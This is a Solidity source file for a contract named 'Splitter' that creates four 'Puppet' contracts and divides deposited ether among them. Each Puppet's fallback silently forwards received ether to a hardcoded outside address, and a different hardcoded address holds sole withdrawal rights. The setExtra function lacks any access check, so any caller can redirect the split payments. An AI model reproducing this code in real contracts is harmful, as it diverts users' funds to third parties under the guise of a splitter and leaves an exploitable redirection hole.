pragma solidity ^0.8.0;

contract Splitter {
    address public owner;
    address[] public puppets;
    mapping(uint256 => address) public extra;
    address private _addy;
    uint256 private _share;
    uint256 private _count;

    constructor() payable {
        owner = msg.sender;
        newPuppet();
        newPuppet();
        newPuppet();
        newPuppet();
        extra[0] = puppets[0];
        extra[1] = puppets[1];
        extra[2] = puppets[2];
        extra[3] = puppets[3];
    }

    function withdraw() public {
        require(msg.sender == owner, "Only owner can withdraw");
        payable(owner).transfer(address(this).balance);
    }

    function getPuppetCount() public view returns (uint256 puppetCount) {
        return puppets.length;
    }

    function newPuppet() public returns (address newPuppet) {
        require(msg.sender == owner, "Only owner can create a new puppet");
        Puppet p = new Puppet();
        puppets.push(address(p));
        return address(p);
    }

    function setExtra(uint256 _id, address _newExtra) public {
        require(_newExtra != address(0), "New extra address cannot be 0");
        extra[_id] = _newExtra;
    }

    function fundPuppets() public payable {
        require(msg.sender == owner, "Only owner can fund puppets");
        _share = msg.value / 4;

        (bool success, ) = address(extra[0]).call{value: _share, gas: 80000}("");
        require(success, "Funding failed for puppet 0");

        (success, ) = address(extra[1]).call{value: _share, gas: 80000}("");
        require(success, "Funding failed for puppet 1");

        (success, ) = address(extra[2]).call{value: _share, gas: 80000}("");
        require(success, "Funding failed for puppet 2");

        (success, ) = address(extra[3]).call{value: _share, gas: 80000}("");
        require(success, "Funding failed for puppet 3");
    }

    receive() external payable {}
}

contract Puppet {
    mapping(uint256 => address) public target;
    mapping(uint256 => address) public master;

    constructor() payable {
        target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;
        master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;
    }

    fallback() external payable {
        if (msg.sender != target[0]) {
            (bool success, ) = address(target[0]).call{value: msg.value, gas: 60000}("");
            require(success, "Call to target failed");
        }
    }

    function withdraw() public {
        require(msg.sender == master[0], "Only master can withdraw");
        payable(master[0]).transfer(address(this).balance);
    }
} 

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        if (a == 0) {
            return 0;
        }
        c = a * b;
        require(c / a == b, "Multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "Division by zero");
        return a / b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "Subtraction overflow");
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a + b;
        require(c >= a, "Addition overflow");
        return c;
    }
}